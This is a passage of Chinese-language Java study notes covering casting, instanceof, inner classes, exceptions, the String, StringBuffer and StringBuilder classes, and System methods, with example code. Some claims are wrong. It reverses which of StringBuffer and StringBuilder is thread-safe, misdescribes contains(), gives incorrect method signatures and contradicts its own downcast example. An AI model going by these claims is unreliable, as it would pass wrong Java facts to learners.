{\n\t\tSystem.out.println(\"汪汪\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tAnimal an1 = new Cat() ;\t//创建Cat类\n\t\tAnimal an2 = new Dog() ;\t//创建Dog类\n\t\tan1.shout();\n\t\tan2.shout();\n\t}\n}\r\n对象类型的转换\r\n\r\n向上转型：子类对象--&gt;父类对象\r\nclass Animal {\n\tpublic void shout() {\n\t\tSystem.out.println(\"喵喵\");\n\t}\n}\n\nclass Dog extends Animal {\n\tpublic void shout() {\n\t\tSystem.out.println(\"汪汪\");\n\t}\n\tpublic void eat() {\n\t\tSystem.out.println(\"吃骨头\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog();\t//向上转型\n\t\tAnimal an = dog;\n\t\tan.shout();\n\t}\n}\n\n输出结果：\n汪汪\r\n\t\tDog dog = new Dog();\n\t\tAnimal an = dog;\n\n可以写成：\n    \tAnimal an = new Dog();\r\n创建一个dog对象，并将dog对象向上转型成Animal类型的对象\r\n\r\n注意：\r\n调用的shout()方法是子类中的shout()方法\r\n父类Animal的对象an是无法调用Dog类中的eat()方法的，因为eat()方法只在子类中定义，没有在父类中定义\r\n也就是说，如果对象发生了向上转型关系后，所调用的方法一定是被子类重写过的方法\r\n\r\n向下转型：父类对象--&gt;子类对象\r\n\t\tAnimal an = new Dog(); //向上转型\n\t\tDog dog = (Dog) an;\t//向下转型\n\t\tdog.shout();\n\t\tdog.eat();\n\n输出结果：\n汪汪\n吃骨头\r\n将Dog类的实例转换成了Animal类的实例an，再将Animal类的示例转换为Dog类的实例\r\n使用dog对象调用shout()方法，由于Animal类的shout()方法已经被子类Dog类重写，因此dog对象调用的方法是被子类重写过的方法，输出结果为喵喵；如果子类Dog类没有重写shout()方法，输出结果则为汪汪\r\n\r\n注意：\r\n在进行对象的向下转型前，必须发生对象向上转型，否则将出现对象转换异常\r\n在向下转型时，不能直接将父类实例强制转换为子类实例，否则程序会报错，如下：\r\nDog dog = (Dog) new Animal;\r\n\r\n\r\ninstancecof关键字\r\n判断一个对象是否是某个类（或接口）的实例，是则返回true，不是则返回false\r\n\t\tAnimal a1 = new Dog();\n\t\tSystem.out.println(\"Animal a1 = new Dog(): \" + (a1 instanceof Animal));\n\t\tSystem.out.println(\"Animal a1 = new Dog(): \" + (a1 instanceof Dog));\n\t\tAnimal a2 = new Animal();\n\t\tSystem.out.println(\"Animal a2 = new Animal(): \" + (a2 instanceof Animal));\n\t\tSystem.out.println(\"Animal a2 = new Animal(): \" + (a2 instanceof Dog));\n\n输出结果：\nAnimal a1 = new Dog(): true\nAnimal a1 = new Dog(): true\nAnimal a2 = new Animal(): true\nAnimal a2 = new Animal(): false\r\na1 instanceof Animal\r\n判断a1是否为Animal的实例\r\nObject类\r\n它是所有类的父类，默认继承Objiect类（超类）\r\n\r\n\r\n\r\n方法名称\r\n方法说明\r\n\r\n\r\n\r\n\r\nboolean equals()\r\n判断两个对象是否相等\r\n\r\n\r\nint hashCode()\r\n返回对象的散列码值\r\n\r\n\r\nString toString()\r\n返回对象的字符串表示形式\r\n\r\n\r\n\r\nclass Animal {\n\tpublic String toString() {\n\t\treturn \"这是一个动物\";\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tAnimal animal = new Animal();\n\t\tSystem.out.println(animal.toString());\n\t}\n}\r\n\r\n注意：Objetc类中的方法可以被重写\r\n\r\n内部类\r\n在一个类的内部定义类\r\n成员内部类\r\n在一个类中定义一个类，这样的类称为成员内部类，内部类所在的类称为外部类\r\nclass Outer {\n\tint m = 0;\n\tvoid test1() {\n\t\tSystem.out.println(\"外部类成员方法test1()\");\n\t}\n\tclass Inner {\n\t\tint n = 1;\n\t\tvoid show1() {\n\t\t\tSystem.out.println(\"外部成员变量m = \" + m);\n\t\t\ttest1();\n\t\t}\n\t\tvoid show2() {\n\t\t\tSystem.out.println(\"内部常用方法show2()\");\n\t\t}\n\t}\n\tvoid test2() {\n\t\tInner inner = new Inner();\n\t\tSystem.out.println(\"内部成员变量n = \" + inner.n);\n\t\tinner.show2();\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tOuter outer = new Outer();\t//实例化外部类对象outer\n\t\tOuter.Inner inner = outer.new Inner();\t//实例化内部类对象inner\n\t\tinner.show1();\n\t\touter.test2();\n\t\tOuter.Inner inner2 = new Outer().new Inner();\n\t\tinner2.show2();\n\t}\n}\r\n\r\n注意：\r\n如果想通过外部类访问内部类，则需要通过外部类创建内部类对象\r\nOuter.Inner inner2 = new Outer().new Inner();\r\n\r\n局部内部类\r\n也称方法内部类，是指定义在某个局部范围中的类，与局部变量一样，都是在方法中定义的，有效范围只限于方法内部\r\n在局部内部类中，局部内部类可以访问外部类的所有成员变量和方法，而局部内部类中变量和方法只能在所属方法中访问\r\nclass Outer {\n\tint m = 0;\n\tvoid test1() {\n\t\tSystem.out.println(\"外部成员方法\");\n\t}\n\tvoid test2() {\n\t\tclass Inner {\t//局部内部类\n\t\t\tint n = 1;\n\t\t\tvoid show() {\n\t\t\t\tSystem.out.println(\"外部成员变量m = \" + m);\n\t\t\t\ttest1();\n\t\t\t}\n\t\t}\n\t\tInner inner = new Inner();\n\t\tSystem.out.println(\"局部内部类变量n = \" + inner.n);\n\t\tinner.show();\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tOuter outer = new Outer();\n\t\touter.test2();\n\t}\n}\r\n静态内部类\r\n静态内部类，就是使用static关键字修饰的成员内部类\r\n但是在功能上，静态内部类只能访问外部类的静态成员，通过外部类访问静态内部类成员时，可以跳过外部类直接访问静态内部类\r\nclass Outer {\n\tstatic int m = 0;\t//静态成员\n\tstatic class Inner {\n\t\tint n = 1;\n\t\tvoid show() {\n\t\t\tSystem.out.println(\"外部静态变量m = \" + m);\n\t\t}\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tOuter.Inner inner = new Outer.Inner();\t//跳过外部类\n\t\tinner.show();\n\t}\n}\r\n匿名内部类\r\n匿名内部类是没有名称的内部类。\r\n当调用某个方法时，如果该方法的参数是接口类型，除了可以传入一个接口实现类外，还可以使用接口的匿名内部类作为参数，在匿名内部类中直接完成方法的实现\r\ninterface Animal {\n\tvoid shout();\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString name = \"小猫\";\n\t\tanimalShout(new Animal() {\n\t\t\t@Override\n\t\t\tpublic void shout() {\n\t\t\t\tSystem.out.println(name + \"喵喵\");\n\t\t\t}\n\t\t});\n\t}\n\tpublic static void animalShout(Animal an) {\n\t\tan.shout();\n\t  }\n}\r\n异常\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tint result = divide(4,0);\n\t\tSystem.out.println(result);\n\t}\n\tpublic static int divide(int x, int y) {\n\t\tint result = x/y;\n\t\treturn result;\n\t}\n}\r\n\r\n算术异常(ArithmeticException)是Java异常类中的一种，Java提供了大量的异常类，这些类都继承自java.lang.Throwable\r\nThrowable类的继承体系\r\n\r\n\r\nError类称为错误类，它表示Java程序运行时产生的系统内部错误或资源耗尽的错误。\r\nException类称为异常类，它表示程序本身可以处理的错误，在Java程序中进行的异常处理，都是针对Exception类及其子类的。在Exception类的众多子类中有一个特殊的子类——RuntimeException类，RuntimeException类及其子类用于表示运行时异常。Exception类的其他子类都用于表示编译时的异常。\r\n\r\nThrowable类的常用方法：\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nString getMessage()\r\n返回异常的消息字符串\r\n\r\n\r\nString toString()\r\n返回异常的简单信息描述\r\n\r\n\r\nvoid printStackTrace()\r\n获取异常类名和异常信息，以及异常出现在程序中的位置，把信息输出在控制台\r\n\r\n\r\n\r\ntry...catch和finally\r\nJava提供了对异常进行处理的方式——异常捕获\r\ntry {\n    //程序代码块\n} catch (ExceptionType(Exception类及其子类) e) {\n    //对ExceptionType的处理\n}\r\n在try代码块中编写可能发生异常的Java语句，在catch代码块中编写针对异常进行处理的代码。\r\n当try代码块中的程序发生了异常，系统会将异常的信息封装成一个异常对象，并将这个对象传递给catch代码块进行处理。catch代码块需要一个参数指明它所能接受的异常类型，这个参数的类型必须是Exception类或其子类。\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\ttry {\n\t\t\tint result = divide(4,0);\n\t\t\tSystem.out.println(result);\n\t\t} catch (Exception e) {\n\t\t\tSystem.out.println(\"捕获的异常信息为： \" + e.getMessage());\n\t\t} finally {\n\t\t\tSystem.out.println(\"进入finally代码块\");\n            return;\n\t\t}\n\t\tSystem.out.println(\"程序继续向下执行......\");\n\t}\n\tpublic static int divide(int x, int y) {\n\t\tint result = x/y;\n\t\treturn result;\n\t}\n}\n\n输出结果：\n捕获的异常信息为： / by zero\n进入finally代码块\r\n在try代码中发生除0异常，程序会通过catch语句捕获异常，在catch语句中通过调用Exception对象的getMessage()方法，返回异常信息/ by zero\r\n在try代码块中，发生异常语句后面的代码时不会被执行的（但发生异常前的代码会被执行）\r\n在程序中，有时候希望有些语句无论程序是否发生异常都要执行，这时就可以在try...catch语句后加一个finally代码块\r\n在catch代码块中增加了一个return语句，用于结束当前方法，这样System.out.println(\"程序继续向下执行......\");代码就不会执行，而fianlly代码中的代码仍会执行\r\n因此，在程序设计时，通常使用finally代码块处理完成必须做的事情，比如释放系统资源\r\n\r\n注意：\r\nfianlly中的代码块在一种情况下是不会执行的，那就是在try...catch中执行了System.exit(0)语句。\r\nSystem.exit(0)语句表示退出当前的Java虚拟机，Java虚拟机停止了，任何代码都不能再执行了\r\n\r\nthrows关键字\r\n修饰符 返回值类型 方法名(参数1， 参数2......) throws 异常类1， 异常类2...... {\n    //方法体......\n}\r\nJava允许在方法的后面使用throws关键字对外声明该方法可能出现的异常，这样调用者在调用方法时，就明确地知道该方法是否有异常，而且必须在程序中对异常进行处理，否则编译无法通过\r\n由于定义divide()方法时声明了抛出异常，调用者在调用divide()方法时就必须处理（用try...catch处理），否则就会发生编译错误\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\ttry {\n\t\t\tint result = divide(4, 2);\n\t\t\tSystem.out.println(result);\n\t\t} catch(Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\tpublic static int divide(int x, int y) throws Exception {\n\t\tint result = x/y;\n\t\treturn result;\n\t}\n}\r\n如果不知道怎么处理，也可以用throws关键字继续将异常抛出\r\n但是程序一旦发生异常，并且异常没有被处理，程序就会被终止\r\npublic class test {\n\tpublic static void main(String[] args) throws Exception {\n\t\t\tint result = divide(4, 2);\n\t\t\tSystem.out.println(result);\n\t}\n\tpublic static int divide(int x, int y) throws Exception {\n\t\tint result = x/y;\n\t\treturn result;\n\t}\n}\r\nException\r\n编译时异常\r\n在Exception类中，除了RuntimeExpection类及其子类外，Exception的其他子类都是编译时异常。\r\n编译时异常的特点是Java编译器会对异常进行检查，如果出现异常就必须对异常进行处理，否则程序无法通过编译\r\n处理方式：\r\n\r\n使用try...catch语句对异常进行捕获处理\r\n使用throws关键字声明抛出异常，调用者对异常进行处理\r\n\r\n运行时异常\r\nRuntimeException类及其子类都是运行时异常。\r\n运行时异常的特点就是Java编译器不会对异常进行检查。当程序中出现这类异常时，即使没有使用try...catch语句捕获或使用throws关键字声明抛出，程序也能编译通过。\r\n运行时异常一般是由程序中的逻辑错误引起的，在运行时无法恢复。\r\n例如：通过数组的角标访问数组的元素，如果角标超过了数组范围，就会发生运行时异常\r\nint[] arr = new int[5];\nSystem.out.println(arr[5]);\r\n自定义异常\r\n自定义的异常类必须继承自Exception或其子类\r\nclass DivideByMinusException extends Exception {\n\tpublic DivideByMinusException() {\n\t\tsuper();\n\t}\n\tpublic DivideByMinusException(String message) {\n\t\tsuper(message);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\ttry { \n\t\t\tint result = divide(4, -2);\n\t\t\tSystem.out.println(result);\n\t\t} catch(DivideByMinusException e) {\n\t\t\tSystem.out.println(e.getMessage());\n\t\t}\n\t}\n\tpublic static int divide(int x, int y) throws DivideByMinusException {\n\t\tif (y &lt; 0) {\n\t\t\tthrow new DivideByMinusException(\"除数是负数\");\n\t\t}\n\t\tint result = x/y;\n\t\treturn result;\n\t}\n}\r\nJava API\r\nAPI是指应用程序编程接口\r\nJava API是指JDK提供的各种功能的Java类\r\n字符串类\r\nString类\r\n\r\nString类的初始化\r\n\r\n使用字符串常量直接初始化一个String对象\r\nString str1 = \"abc\";\r\n使用String类的构造方法初始化字符串对象\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nString()\r\n创建一个内容为空的字符串\r\n\r\n\r\nString(String value)\r\n根据指定的字符串内容创建对象\r\n\r\n\r\nString(char[] value)\r\n根据指定的字符串数组创建对象\r\n\r\n\r\nString(byte[] bytes)\r\n根据指定的字节数组创建对象\r\n\r\n\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//创建一个空的字符串\n\t\tString str1 = new String();\n\t\t//创建一个内容为abcd的字符串\n\t\tString str2 = new String(\"abcd\");\n\t\t//创建一个内容为字符数组的字符串\n\t\tchar[] charArray = new char[] {'D', 'E', 'F'};\n\t\tString str3 = new String(charArray);\n\t\t//创建一个内容为字节数组的字符串\n\t\tbyte[] arr = {97, 98, 99};\n\t\tString str4 = new String(arr);\n\t\tSystem.out.println(\"a\" + str1 + \"b\");\n\t\tSystem.out.println(str2);\n\t\tSystem.out.println(str3);\n\t\tSystem.out.println(str4);\n\t}\n}\r\n\r\nString类的常见操作\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nint indexOf(int ch)\r\n返回指定字符ch在字符串中第一次出现位置的索引\r\n\r\n\r\nint lastIndexOf(int ch)\r\n返回指定字符ch在字符串中最后一次出现位置的索引\r\n\r\n\r\nint indexOf(String str)\r\n返回指定子字符串str在字符串第一次出现位置的索引\r\n\r\n\r\nint lastIndexOf(String str)\r\n返回指定字字符串str在字符串中最后一次出现位置的索引\r\n\r\n\r\nchar charAt(int index)\r\n返回字符串中**index位置上的字符**，其中index的取值范围0~(字符串长度-1)\r\n\r\n\r\nBoolean endsWith(String suffix)\r\n判断此字符串是否以指定的字符结尾\r\n\r\n\r\nint length()\r\n返回此字符串的长度\r\n\r\n\r\nboolean equals(Object anObject)\r\n将此字符串与指定的字符串比较\r\n\r\n\r\nboolean isEmpty()\r\n判断字符串长度是否为0，如果为0，则返回true；反之，则返回false\r\n\r\n\r\nboolean startsWith(String prefix)\r\n判断此字符串是否以指定的字符串开始\r\n\r\n\r\nboolean contains(CharSequence cs)\r\n判断此字符串是否以指定的字符串结尾\r\n\r\n\r\nString toLowerCase()\r\n使用默认语言环境的规则将String中的所有字符都转换为小写字母\r\n\r\n\r\nString toUpperCase()\r\n使用默认语言环境的规则将String中的所有字符都转换为大写字母\r\n\r\n\r\nstatic String valueOf(int i)\r\n将int变量i转换成字符串\r\n\r\n\r\nchar[] toCharArray()\r\n将此字符串转换为一个字符数组\r\n\r\n\r\nString replace(CharSequence oldstr, CharSequence newstr)\r\n返回一个新的字符串，它是通过用newstr替换此字符串中出现的所有oldstr得到的\r\n\r\n\r\nString[] split(String regex)\r\n根据参数regex将原来的字符串分割为若干个字符串\r\n\r\n\r\nString substring(int beginIndex)\r\n返回一个新的字符串，它包含从指定的beginIndex处开始，直到此字符串末尾的所有字符\r\n\r\n\r\nString substring(int beginIndex, int endIndex)\r\n返回一个新字符串，它包含从指定的**beginIndex处开始，直到索引**endIndex-1处的所有字符\r\n\r\n\r\nString trim()\r\n返回一个新字符串，它去除了原字符串首位的空格\r\n\r\n\r\n\r\n\r\n字符串的获取功能\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s = \"ababcdedcba\";\n\t\tSystem.out.println(\"字符串的长度为：\" + s.length());\n\t\tSystem.out.println(\"字符串中第一个字符：\" + s.charAt(0));\n\t\tSystem.out.println(\"字符c第一次出现的位置：\" + s.indexOf('c'));\n\t\tSystem.out.println(\"字符c最后一次出现的位置：\" + s.lastIndexOf('c'));\n\t\tSystem.out.println(\"子字符串ab第一次出现的位置：\" + s.indexOf(\"ab\"));\n\t\tSystem.out.println(\"子字符串ab最后一次出现的位置：\" + s.lastIndexOf(\"ab\"));\n\t}\n}\r\n字符串的转换操作\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString str = \"abcd\";\n\t\tSystem.out.println(\"将字符串转换成字符数组后的结果：\");\n\t\tchar[] charArray = str.toCharArray();\n\t\tfor(int i = 0; i &lt; charArray.length; i++) {\n\t\t\tif(i != charArray.length-1) {\n\t\t\t\tSystem.out.print(charArray[i] + \",\");\n\t\t\t} else {\n\t\t\t\tSystem.out.println(charArray[i]);\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"将int值转换成String类型之后的结果：\" + String.valueOf(12));\n\t\tSystem.out.println(\"将字符串转换成大写字母之后的结果：\" + str.toUpperCase());\n\t\tSystem.out.println(\"将字符串转换成小写字母之后的结果：\" + str.toLowerCase());\n\t}\n}\r\n字符串的替换和去除空格操作\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s = \"itcast\";\n\t\tSystem.out.println(\"将it替换成cn.it的结果：\" + s.replace(\"it\", \"cn.it\"));\n\t\tString s1 = \"    i t c a s t    \";\n\t\tSystem.out.println(\"去除字符串两端的空格后的结果：\" + s1.trim());\n\t\tSystem.out.println(\"去除字符串中所有空格后的结果：\" + s1.replace(\" \", \"\"));\t\t//去除所有空格！\n\t}\n}\r\n字符串的判断操作\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s1 = \"String\";\n\t\tString s2 = \"Str\";\n\t\tSystem.out.println(\"判断是否以字符串Str开头：\" + s1.startsWith(\"Str\"));\n\t\tSystem.out.println(\"判断是否以字符串ng结尾：\" + s1.endsWith(\"ng\"));\n\t\tSystem.out.println(\"判断是否包含字符串tri：\" + s1.contains(\"tri\"));\n\t\tSystem.out.println(\"判断字符串是否为空：\" + s1.isEmpty());\n\t\tSystem.out.println(\"判断两个字符串是否相等：\" + s1.equals(s2));\n\t}\n}\r\n\r\n判断两个字符串是否相等：\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString str1 = new String(\"abc\");\n\t\tString str2 = new String(\"abc\");\n  //结果为false，因为str1和str2是两个对象\n\t\tSystem.out.println(str1 == str2);\n  //结果为true，因为str1和str2字符内容相同\n\t\tSystem.out.println(str1.equals(str2));\n\t}\n}\n\n输出结果：\nfalse\ntrue\r\n在程序中，通过==和equals()两种方式对字符串进行比较，区别不同\r\n\r\nequals()方法用于比较两个字符串中的字符是否相等\r\n==用于比较两个字符串对象的地址是否相同\r\n\r\n\r\n字符串的截取和分割\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString str = \"石家庄-武汉-哈尔滨\";\n\t\t//下面是字符串截取操作\n\t\tSystem.out.println(\"从第5个字符截取到末尾的结果：\" + str.substring(4));\n\t\tSystem.out.println(\"从第5个字符截取到第6个字符的结果：\" + str.substring(4, 6));\n\t\t//下面是字符串分割操作\n\t\tSystem.out.println(\"分割后的字符串数组的元素依次为：\");\n\t\tString[] strArray = str.split(\"-\");\t//将字符串转换为字符数组\n\t\tfor(int i = 0; i &lt; strArray.length; i++) {\n\t\t\tif(i != strArray.length-1) {\n\t\t\t\tSystem.out.print(strArray[i] + \",\");\n\t\t\t} else {\n\t\t\t\t//数组的的最后一个元素后面不加逗号\n\t\t\t\tSystem.out.println(strArray[i]);\n\t\t\t}\n\t\t}\n\t}\n}\r\n\r\n\r\n字符串角标越界异常：\r\nSting字符串在获取某个字符时会用到字符的索引，当访问字符串中的字符时，如果字符的索引不存在，则会发生StingIndexOutOfBoundsException（字符串角标越界异常）\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s = \"itcast\";\n\t\tSystem.out.println(s.charAt(8));\n\t}\n}\r\n\r\n\r\n\r\nStringBuffer类\r\n字符串是常量，一旦创建，其内容和长度是不可改变的\r\nStringBuffer类（也称字符串缓冲区），它的内容和长度都是可以改变的\r\nStringBuffer类似一个字符容器，当在其中添加或删除字符时，并不会产生新的StingBuffer对象\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nStringBuffer append(char c)\r\n添加参数到StringBuffer对象中\r\n\r\n\r\nStringBuffer insert(int offset, String str)\r\n在字符串中的offset位置插入字符串str\r\n\r\n\r\nStringBuffer deleteCharAt(int index)\r\n删除此序列指定位置的字符\r\n\r\n\r\nStringBuffer delete(int start, int end)\r\n删除StringBuffer对象中指定范围的字符或字符串序列\r\n\r\n\r\nStringBuffer replace(int start, int end, String s)\r\n在StringBufer对象中替换指定的字符或字符串序列\r\n\r\n\r\nvoid setCharAt(int index, char ch)\r\n修改指定位置index处的字符序列\r\n\r\n\r\nString toString()\r\n返回StringBuffer缓冲区中的字符串\r\n\r\n\r\nStringBuffer reverse()\r\n将此字符序列用其反转形式取代\r\n\r\n\r\n\r\nStringBuffer的一些列常用方法\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"1、添加---------------------\");\n\t\tadd();\n\t\tSystem.out.println(\"2、删除---------------------\");\n\t\tremove();\n\t\tSystem.out.println(\"3、修改---------------------\");\n\t\talter();\n\t}\n\tpublic static void add() {\n\t\tStringBuffer sb = new StringBuffer();\n\t\tsb.append(\"itcast\");\t//在末尾添加字符串\n\t\tSystem.out.println(\"append添加结果：\" + sb);\n\t\tsb.insert(2, \"123\");\t//在指定的位置插入字符串\n\t\tSystem.out.println(\"insert添加结果：\" + sb);\n\t}\n\tpublic static void remove() {\n\t\tStringBuffer sb = new StringBuffer(\"itcastcn\");\n\t\tsb.delete(1, 5);\t//指定范围删除\n\t\tSystem.out.println(\"删除指定位置结果：\" + sb);\n\t\tsb.deleteCharAt(2);\t//指定位置删除\n\t\tSystem.out.println(\"删除指定位置结果：\" + sb);\n\t\tsb.delete(0, sb.length()); \t//清空缓冲区\n\t\tSystem.out.println(\"清空缓冲区结果：\" + sb);\n\t}\n\tpublic static void alter() {\n\t\tStringBuffer sb = new StringBuffer(\"itcastcn\");\n\t\tsb.setCharAt(1,'p');\t//修改指定位置字符\n\t\tSystem.out.println(\"修改指定位置字符结果：\" + sb);\n\t\tsb.replace(1, 3, \"qq\");\t//替换指定位置字符串或字符\n\t\tSystem.out.println(\"替换指定位置字符（串）结果：\" + sb);\n\t\tSystem.out.println(\"字符串反转结果：\" + sb.reverse());\n\t}\n}\n\n输出结果：\n1、添加---------------------\nappend添加结果：itcast\ninsert添加结果：it123cast\n2、删除---------------------\n删除指定位置结果：itcn\n删除指定位置结果：itn\n清空缓冲区结果：\n3、修改---------------------\n修改指定位置字符结果：ipcastcn\n替换指定位置字符（串）结果：iqqastcn\n字符串反转结果：nctsaqqi\r\nStringBuilder类\r\nStringBuilder和StringBuffer类的对象都可以被多次修改，并不产生新的未使用对象。\r\n最大的区别在于StringBuilder的方法是非线程安全的，也就是说，StringBuffer不能被同步访问，而StringBuilder可以。\r\n\r\nString、StringBuffer和StringBuilder的区别：\r\npublic class test {\n\tprivate static final int TIMES = 100000;\n\tpublic static void main(String[] args) {\n\t\ttest.testString();\n\t\ttest.testStringBuffer();\n\t\ttest.testStringBuilder();\n\t}\n\t//String时间效率测试\n\tpublic static void testString() {\n\t\tlong startTime = System.currentTimeMillis();\n\t\tString str = \"\";\n\t\tfor(int i = 0; i &lt; TIMES; i++) {\n\t\t\tstr += \"test\";\n\t\t}\n\t\tlong endTime = System.currentTimeMillis();\n\t\tSystem.out.println(\"String test usedtime: \" + (endTime - startTime));\n\t}\n\t//StringBuffer时间效率测试（线程安全）\n\tpublic static void testStringBuffer() {\n\t\tlong startTime = System.currentTimeMillis();\n\t\tStringBuffer str = new StringBuffer();\n\t\tfor(int i = 0; i &lt; TIMES; i++) {\n\t\t\tstr.append(\"test\");\n\t\t}\n\t\tlong endTime = System.currentTimeMillis();\n\t\tSystem.out.println(\"StringBuffer test usedtime: \" + (endTime - startTime));\n\t}\n\t//StringBuilder时间效率测试（非线性安全）\n\tpublic static void testStringBuilder() {\n\t\tlong startTime = System.currentTimeMillis();\n\t\tStringBuilder str = new StringBuilder();\n\t\tfor(int i = 0; i &lt; TIMES; i++) {\n\t\t\tstr.append(\"test\");\n\t\t}\n\t\tlong endTime = System.currentTimeMillis();\n\t\tSystem.out.println(\"StringBuilder test usedtime: \" + (endTime - startTime));\n\t}\n}\n\n输出结果：\nString test usedtime: 4780\nStringBuffer test usedtime: 3\nStringBuilder test usedtime: 2\r\n三者的工作效率：StringBuilder &gt; StringBuffer &gt; String\r\n\r\nString类表示的字符串是常量，内容和长度无法改变；而StringBuffer和StringBuilder表示字符容器，其内容和长度可以改变\r\n如果该字符串时，如果该字符串仅用于表示数据类型，则使用String类即可；但是如果需要对字符串中的字符进行增加或删除操作，则应该使用StringBuffer与StringBuilder类\r\n如果有大量字符串拼接操作，在不要求线程安全的情况下，采用StringBuilder更高效；相反，如果需要线程安全，则需要使用StringBuffer\r\nequals()方法对StringBuffer类与StringBuilder类不起作用\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s1 = new String(\"abc\");\n\t\tString s2 = new String(\"abc\");\n\t\tSystem.out.println(s1.equals(s2));\t//true\n\t\tStringBuffer sb1 = new StringBuffer(\"abc\");\n\t\tStringBuffer sb2 = new StringBuffer(\"abc\");\n\t\tSystem.out.println(sb1.equals(sb2));\t//false\n\t\tStringBuilder sbr1 = new StringBuilder(\"abc\");\n\t\tStringBuilder sbr2 = new StringBuilder(\"abc\");\n\t\tSystem.out.println(sbr1.equals(sbr2));\t//false\n\t}\n}\r\nString类对象可以用操作符+进行拼接，而StringBuffer类和StringBuilder对象之间不能\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString s1 = \"a\";\n\t\tString s2 = \"b\";\n\t\tString s3 = s1 + s2;\t//合法\n\t\tSystem.out.println(s3);\n\t\tStringBufffer sb1 = new StringBuffer(\"a\");\n\t\tStringBufffer sb2 = new StringBuffer(\"b\");\n\t\tStringBuffer sb3 = sb1 + sb2;\t//非法\n\t\tSystem.out.println(s3);\n\t\tStringBuilder sbr1 = new StringBuilder(\"a\");\n\t\tStringBuilder sbr2 = new StringBuilder(\"b\");\n\t\tStringBuilder sbr3 = sbr1 + sbr2;\t//非法\n\t\tSystem.out.println(sbr3);\n\t}\n}\r\n\r\n\r\nSystem类与Runtime类\r\nSystem类\r\nSystem类定义了一些与系统相关的属性和方法，它所提供的属性和方法都是静态的\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n方法名称\r\n功能描述\r\n\r\n\r\n\r\n\r\nstatic void exit(int status)\r\n该方法用于终止当前正在运行的Java虚拟机，若状态码非0，则表示异常终止\r\n\r\n\r\nstatic void gc()\r\n运行垃圾回收器，用于对垃圾进行回收\r\n\r\n\r\nstatic void currentTimeMillis()\r\n返回以毫秒为单位的当前时间\r\n\r\n\r\nstatic void arraycopy(Object src, int srcPos, Object destPos, int length)\r\n从src引用的指定源数组复制得到dest引用的数组，复制从指定位置开始，到目标数组的指定位置结束\r\n\r\n\r\nstatic Properties getProperties()\r\n取得当前的系统属性\r\n\r\n\r\nstatic String getProperty(String key)\r\n获取指定键描述的系统属性\r\n\r\n\r\n\r\n\r\narraycopy()方法\r\n用于将数组从源数组复制到目标数组\r\nstatic void arraycopy(Object src, int srcPos, Object destPos, int length)\r\n\r\nsrc：表示源数组\r\ndest：表示目标数组\r\nsrcPos：表示源数组中复制元素的起始位置\r\ndestPos：表示复制到目标数组的起始位置\r\nlength：表示复制元素的个数\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tint[] fromArray = {10, 11, 12, 13, 14, 15 };\t//源数组\n\t\tint[] toArray = {20, 21, 22, 23, 24, 25, 26 };\t//目标数组\n\t\tSystem.arraycopy(fromArray, 2, toArray, 3, 4);\t//复制数组元素\n\t\t//打印复制后数组的元素\n\t\tSystem.out.println(\"复制后的数组元素：\");\n\t\tfor(int i = 0; i &lt; toArray.length; i++) {\n\t\t\tSystem.out.println(i + \": \" + toArray[i]);\n\t\t}\n\t}\n}\r\n\r\n注意：\r\n在进行数组复制，目标数组必须有足够的空间来存放复制的元素，否则会发生角标越界异常。\r\n\r\ncurrentTimeMiliis()方法\r\n用于获取当前系统的时间，返回值类型是long类型，该值表示当前时间于1970年1月1日0点0分0秒之间的时间差，单位是毫秒，通常也将该值称为时间戳\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tlong startTime = System.currentTimeMillis();\t//循环开始时的当前时间\n\t\tint sum = 0;\n\t\tfor(int i = 0; i &lt; 1000000000; i++) {\n\t\t\tsum += i;\n\t\t}\n\t\tlong endTime = System.currentTimeMillis();\t//循环结束后的当前时间\n\t\tSystem.out.println(\"程序运行的时间为：\" + (endTime - startTime) + \"毫秒\");\n\t}\n}\r\ngetProperties()和getProperty()方法\r\n\r\ngetProperties：用于获取当前系统的全部属性，该方法会返回一个Properties对象，其中封装了系统的所有属性，这些属性都是以键值对形式存在的\r\ngetProperty：用于根据系统的属性名获取对应的属性值\r\n\r\nimport java.util.*;\npublic class test {\n\tpublic static void main(String[] args) {\n\t\t//获取当前系统属性\n\t\tProperties properties = System.getProperties();\n\t\t//获取所有属性的key，返回Enumeration对象\n\t\tEnumeration propertyNames = properties.propertyNames();\n\t\twhile(propertyNames.hasMoreElements()) {\n\t\t\t//获取系统属性的key\n\t\t\tString key = (String) propertyNames.nextElement();\n\t\t\t//获得当前key对应的value\n\t\t\tString value = 